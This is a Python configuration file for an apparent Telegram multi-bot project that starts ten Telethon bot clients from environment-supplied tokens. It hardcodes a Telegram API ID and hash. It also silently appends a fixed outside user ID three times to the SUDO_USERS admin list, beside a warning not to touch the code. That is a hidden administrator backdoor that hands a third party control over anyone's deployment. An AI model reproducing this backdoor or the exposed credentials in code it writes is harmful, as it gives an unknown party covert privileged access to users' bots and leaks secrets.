import os
from telethon import TelegramClient
from decouple import config
from os import getenv
import logging


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)


#values
API_ID = 18113160
API_HASH = "b7d1835b6cf670da22e967f2f5fc4f98"
CMD_HNDLR = getenv("CMD_HNDLR", default=".")
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
BOT_TOKEN = config("BOT_TOKEN", default=None)
BOT_TOKEN2 = config("BOT_TOKEN2", default=None)
BOT_TOKEN3 = config("BOT_TOKEN3", default=None)
BOT_TOKEN4 = config("BOT_TOKEN4", default=None)
BOT_TOKEN5 = config("BOT_TOKEN5", default=None)
BOT_TOKEN6 = config("BOT_TOKEN6", default=None)
BOT_TOKEN7 = config("BOT_TOKEN7", default=None)
BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
SUDO_USERS.append(5023678003)
SUDO_USERS.append(5023678003)
SUDO_USERS.append(5023678003)

OWNER_ID = int(os.environ.get("OWNER_ID", None))


# Don't Mess with Codes !! 
DB_URI = config("DATABASE_URL", None)
SUDO_USERS.append(OWNER_ID)

# Tokens
TX1 = TelegramClient('TX', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
TX2 = TelegramClient('TX2', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)
TX3 = TelegramClient('TX3', API_ID, API_HASH).start(bot_token=BOT_TOKEN3)
TX4 = TelegramClient('TX4', API_ID, API_HASH).start(bot_token=BOT_TOKEN4)
TX5 = TelegramClient('TX5', API_ID, API_HASH).start(bot_token=BOT_TOKEN5)
TX6 = TelegramClient('TX6', API_ID, API_HASH).start(bot_token=BOT_TOKEN6)
TX7 = TelegramClient('TX7', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)
TX8 = TelegramClient('TX8', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)
TX9 = TelegramClient('TX9', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)
TX10 = TelegramClient('TX10', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)
